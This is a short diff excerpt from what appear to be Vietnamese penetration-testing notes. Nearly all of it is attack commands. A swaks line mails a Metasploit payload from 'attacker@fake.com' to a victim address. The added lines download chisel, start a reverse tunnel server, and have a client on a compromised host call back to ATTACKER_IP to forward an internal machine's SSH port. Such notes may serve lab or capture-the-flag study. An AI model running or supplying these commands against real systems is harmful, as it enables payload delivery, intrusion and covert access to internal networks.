@@ -69,3 +69,16 @@ Mục tiêu: hiểu “cấu trúc” và “ai/ở đâu” vận hành hạ t�
 swaks --to victim@target.com --from attacker@fake.com --server localhost:25 --attach ~/.msf4/local/payload.tar --body "Test attachment" --header "Subject: Important File"
 
 ```
+```
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+gunzip chisel_1.9.1_linux_amd64.gz
+chmod +x chisel_1.9.1_linux_amd64
+mv chisel_1.9.1_linux_amd64 chisel
+
+https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.exe
+
+./chisel server -p 443 --reverse
+
+chisel.exe client ATTACKER_IP:443 R:2222:10.10.10.10:22
+
+
